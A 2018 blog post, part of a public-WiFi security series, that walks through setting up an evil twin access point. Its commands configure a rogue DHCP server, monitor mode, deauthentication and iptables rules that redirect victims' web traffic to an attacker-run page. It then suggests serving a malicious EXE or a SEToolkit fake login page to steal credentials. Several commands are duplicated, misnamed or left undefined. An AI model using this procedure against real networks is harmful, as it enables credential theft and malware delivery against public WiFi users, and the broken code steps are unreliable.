---
layout: post
title:  "The Myths Of Public WiFi - Pt5. What If The Router Is Hacked?"
date:   2018-11-22 14:56:03 -0400
categories: jekyll update
---

<br>[Part 4 (If I See The Lock In My Browser's URL, Does That Mean I'm Safe?)][part-4]

<b>Legal Disclosure: Don't do this on networks other than your own without written consent from the network administrator. Otherwise, you would be committing an illegal act.</b>

When using public WiFi, your request will normally be redirected to a term of service page. This is to prevent the owner from being liable if someone else uses their network to promote illegal activities. What does this mean for an attacker? If someone attempts to go to a website, the router will redirect them successfully. If you have been keeping up with my previous DNS Hijack article, then you are probably questioning how that happens. If a browser is supposed to prevent HTTPS redirects, then how does the webpage successfully load? DHCP redirects. ARP poisoning and DNS hijacking redirect to a different IP by USING the domain. The router on the other hand routes traffic as a whole. The router uses iptables and ignores the domain altogether. What if the attacker could act as a router and take advantage of this process? He could bring his own router and configure it with the same SSID and load in a fake terms of service page. If he were to do this, the victim would see two of the same APs. Normally he would write this off as a glitch and click the top AP on the list. But what if you as the attacker could mimic the AP exactly? Enter the Evil Twin AP. The attacker’s computer can fake the identity of the real AP. If your router is a clone, then the victim's device will automatically connect to the one with a stronger signal strength. Keep in mind that this will NOT work on encrypted WiFi.

<b>Roadmap</b>

-Download the DHCP server utilities and configure the common IP settings.

-Turn our computer WiFi adapter to monitor mode.

-Gather the SSID, MAC addresses and channel number of the victim and the attacker.

-Start a fake AP.

-Start the DHCP server and configure the routing rules.

We need to start by downloading isc-dhcp-server

{% highlight ruby %}
sudo apt-get install isc-dhcp-server
{% endhighlight %}

Now we will need to back up the configuration file.

{% highlight ruby %}
sudo apt-get install isc-dhcp-server
{% endhighlight %}

Once the file is backed up we need to create a few generic DHCP settings of our own.

{% highlight ruby %}
sudo cp /etc/dhcp/dhcpd.conf /etc/dhcp/dhcpd.original.conf
sudo nano /etc/dhcp/dhcpd.et.conf
{% endhighlight %}

Copy and paste this information.

{% highlight ruby %}
authoritative;
default-lease-time 600;
max-lease-time 7200;
subnet 192.168.2.0 netmask 192.168.2.0
{
option subnet-mask 255.255.255.0;
option broadcast-address 192.168.2.255;
option routers 192.168.2.1;
option domain-name-servers 8.8.8.8;
range 192.168.2.20 192.168.2.60;
}
{% endhighlight %}

Our fake router can allow up to 253 connections. If you would like to understand these settings more, then I may write another article about subnetting. The explication will be outside the scope of this current tutorial.

<b>Making Life Easier With The .bashrc File</b>

Start by creating the following environment variables. There is a difference between BSSID and ESSID. BSSID is the Mac address and ESSID is the conventional SSID or router name.

{% highlight ruby %}
targetBSSID="";
gatewayBSSID="";
gatewayESSID="";
ch="";
wpower="27";
#wpower is the amount of energy we want to give the WiFi adapter to increase it's signal strength. Legal limit is 27.
#I am not liable if you decide to go above the legal limit.
wifi="$(ifconfig | grep flags | awk '{print $1}' | sed -n 3p | tr -d ':')";
#If you are not using a virtual machine, you will not need the $wifi varible. If you are using Kali as a native system, then replace $wifi with $adp
{% highlight ruby %}

By default, a router is placed into promiscuous mode. We need to switch it to monitor mode. Promiscuous mode is “normal” people WiFi mode. Think of promiscuous mode as a dumb beacon or an antenna. All it does is take in traffic as it comes and spits out what you tell it to. You won’t be able to access the internet because it requires a complicated series of handshakes. Monitor mode will simply accept everything.

{% highlight ruby %}
function mon ()
{
sudo sysctl -w net.ipv4.ip_forward=1;
sudo systemctl start apache2;
sudo ifconfig $wifi down;
sudo ifconfig $wifi mode monitor;
sudo ifconfig $wifi up;
sudo airmon-ng check;
sudo airmon-ng start $wifi;
}
{% endhighlight %}

Once we place the WiFi adapter in monitor mode, we will need to see what the BSSID (MAC Address) and ESSID (SSID) of everything in the air.

{% highlight ruby %}
function dump ()
{
sudo airodump-ng $wifi;
}
{% endhighlight %}

Now we need to create a new adapter to tunnel out traffic to and we need to include a series of firewall rules to redirect our traffic. Explaining these rules will require an entire tutorial series on their own. For now, just copy and paste them

Note: The environment variable will not pass in the destination argument. Replace 192.168.1.4 with your own IP.

{% highlight ruby %}
function route ()
{
#sudo ifconfig $wifi txpower $wpower;
#WARNING! The above line is commented out. It increases the power hence signal strength I have not tested this in a virtual machine because I do not know the risk. You should not either!!
#I am not liable if you decide to go above the legal limit.

sudo cp /etc/dhcp/dhcpd.et.conf /etc/dhcp/dhcpd.conf;
sudo ifconfig at0 up;
sudo ifconfig at0 192.168.2.1 netmask 255.255.255.0;
sudo dhcpd -cf /etc/dhcp/dhcpd.conf -pf /var/run/dhcpd.pid at0;
#sudo systemctl restart isc-dhcp-server;

sudo iptables --table nat --append POSTROUTING --out-interface $adp -j MASQUERADE;

sudo iptables --append FORWARD --in-interface at0 -j ACCEPT;

sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.1.4:80;

sudo iptables -t nat -A POSTROUTING -j MASQUERADE;
}
{% endhighlight %}

Add the option to erase the iptables firewall rules when complete.

{% highlight ruby %}
function iptables_flush ()
{
# flush all chains
sudo iptables -F;
sudo iptables -t nat -F;
sudo iptables -t mangle -F;
# delete all chains
sudo iptables -X;
}
{% endhighlight %}

And finally, we need to add in code to knock our victim off the router and have him reconnect to ours.

{% highlight ruby %}
function kick ()
{
sudo airodump-ng $wifi;
}
{% endhighlight %}

Save and close.

<b>Gathering Information</b>

If you want to get the victim's BSSID (MAC address) then you will need to poison the ARP tables, then find it with wireshark.

{% highlight ruby %}
poison
#new tab
sudo wireshark
{% endhighlight %}

Look under the Ethernet II header. And no, I have no issue sharing my MAC address

![image tooltip](/blog/images/beef/et_wireshark.JPG)

Start by placing your adapter in monitor mode.

{% highlight ruby %}
mon
{% endhighlight %}

Use ifconfig to make sure your a new adapter with the word “mon” has appeared. The output should look something similar to the following image. If there is any process other than the two listed, kill them with

{% highlight ruby %}
kill PID
#PID being the process ID
{% endhighlight %}

![image tooltip](/blog/images/beef/et_mon.JPG)

Exit your terminal window in order for the $wifi variable to adopt the new "mon" name.

Now we need to gather some information. Use this command.

{% highlight ruby %}
dump
{% endhighlight %}

As you can see it dumps all the information in the air. Take note of the

Router ESSID

Router BSSID

Target ESSID

Target BSSID

![image tooltip](/blog/images/beef/et_dump.JPG)

We need to go back to our new environment variables in the .bashrc file and fill in what we just learned.

{% highlight ruby %}
nano .bashrc
{% endhighlight %}

Open a new tab and create the base router

{% highlight ruby %}
base
{% endhighlight %}

You should get something like this

![image tooltip](/blog/images/beef/et_base.JPG)

Let airbase run and open a new terminal tab. Now we will use airbase to convert your computer into a DHCP server and route all traffic to your fake terms if service page.

![image tooltip](/blog/images/beef/et_route.JPG)

And finally, use the deauth command to kick him off the router. Let it run for a few seconds then close it out. I scheduled 100 deauth packets to be sent.

{% highlight ruby %}
kick
{% endhighlight %}

Apache should already be running since we included it in the mon() function. Editing the file will require some programming knowledge. But you can basically do one of two things. Tell the user he needs to accept an EXE download as an "activation key" or reroute him to another HTTP server of yours hosting a fake login page with SEToolkit. Keep in mind the URL won't be the same with this method. You may have to also [register a certificate][certbot] from the EFF to make it look legitimate, but I bet most people will fall for it.

<b>Conslusion</b>

The attacker has an extra advantage with unencrypted WiFi. He can take advantage of the terms of service page. The victim will be puzzled by his computer going offline. He will be able to reconnect, but it will be on a clone replica of the normal router. It's less suspicious if he sees the terms of service page. He will just assume it was a "glitch" and just click the things that makes the process move forward. An EXE will look suspicious but a login page will be more believable. "I lost internet so I must have lost my login session" would be typical user logic.

[part-6][Part-6 (Securing Yourself)]

[part-4]: https://danielloosec.github.io/blog/jekyll/update/2018/11/22/PublicWifiMyths_Part_4.html
[part-6]: https://danielloosec.github.io/blog/jekyll/update/2018/11/22/PublicWifiMyths_Part_6.html
[certbot]: https://certbot.eff.org

